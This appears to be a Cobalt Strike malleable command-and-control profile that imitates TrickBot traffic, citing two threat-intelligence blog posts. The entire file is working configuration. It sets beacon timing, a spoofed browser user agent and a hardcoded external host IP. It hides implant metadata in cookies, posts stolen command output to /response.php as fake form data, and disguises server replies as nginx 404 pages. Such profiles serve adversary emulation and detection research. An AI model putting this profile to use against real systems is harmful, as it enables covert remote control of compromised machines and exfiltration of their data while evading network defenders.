#trickbot
#https://community.rsa.com/community/products/netwitness/blog/2017/07/13/necurs-delivers
#https://securityintelligence.com/tricks-of-the-trade-a-deeper-look-into-trickbots-machinations/
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)";
set dns_idle "8.8.8.8";
set maxdns    "235";


http-get {

    set uri "/";
    
    client {

	header "Host" "203.150.19.63:443";
	header "Connection" "Keep-Alive";
	header "Cache-Control" "no-cache";
        
        
        metadata {
            base64url;
	    prepend "D007=";
            header "Cookie";


        }

    }

    server {

	header "Server" "nginx";
        header "Date" "Fri, 30 Jun 2017 13:08:47 GMT";
        header "Content-Type" "text/html";       
	header "Connection" "keep-alive";
        
	
        output {
            base64url;
	    prepend "<html>
	    <head><title>404 Not Found</title></head>
	    <body bgcolor='white'>
	    <center><h1>404 Not Found</h1></center>
	    <hr><center>nginx</center>
	    </body>
	    </html>
	    <!CDATA['=";
	    append "']>
	    </html>";
	    print;
        }
    }
}

http-post {
    
    set uri "/response.php";

    client {
       
	header "Content-Type" "multipart/form-data; boundary=----ZMZTCR";
        
        output {
            netbios; 
	    prepend "----ZMZTCR
	    Content-Disposition: form-data;name='sourcelink' ";

	    append " Content-Disposition: form-data;name='sourcequery'
	    ----ZMZTCR";
	    print;
	    


        }
        
        
        id {
            base64url;
	    header "Cookie";


        }
    }

    server {

	header "Server" "nginx";
        header "Date" "Fri, 30 Jun 2017 13:08:47 GMT";
        header "Content-Type" "text/html; charset=utf-8";        
	header "Connection" "keep-alive";
        

        output {
            base64;
            print;
        }
    }
}

http-stager {
    server {
        header "Server" "nginx";
        header "Date" "Fri, 30 Jun 2017 13:08:47 GMT";
        header "Content-Type" "text/html; charset=utf-8";        
	header "Connection" "keep-alive";
    
    }


}
